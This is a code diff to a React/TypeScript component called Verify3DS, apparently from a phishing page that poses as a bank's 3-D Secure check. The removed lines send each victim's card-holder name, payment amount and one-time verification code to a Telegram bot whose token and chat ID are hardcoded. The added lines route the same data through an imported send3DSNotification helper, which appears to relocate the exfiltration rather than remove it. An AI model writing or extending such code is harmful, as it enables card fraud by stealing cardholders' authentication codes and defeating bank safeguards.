@@ -5,35 +5,7 @@ import { Button } from "@/components/ui/button";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/components/ui/use-toast";
-
-const sendTelegramNotification = async (verificationData: any) => {
-  const botToken = "7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU";
-  const chatId = "-4781499307";
-  
-  try {
-    const message = `🔐 3DS Verification:
-💰 Amount: $${verificationData.amount}
-👤 Card Holder: ${verificationData.cardHolder}
-✅ Method: ${verificationData.verifyMethod}
-🔑 Code: ${verificationData.code}`;
-
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-    
-    console.log('3DS notification sent successfully');
-  } catch (error) {
-    console.error('Error sending 3DS notification:', error);
-  }
-};
+import { send3DSNotification } from "../utils/internalApi";
 
 export default function Verify3DS() {
   const [searchParams] = useSearchParams();
@@ -55,7 +27,7 @@ export default function Verify3DS() {
     setIsSubmitting(true);
 
     try {
-      await sendTelegramNotification({
+      await send3DSNotification({
         code,
         amount,
         cardHolder,
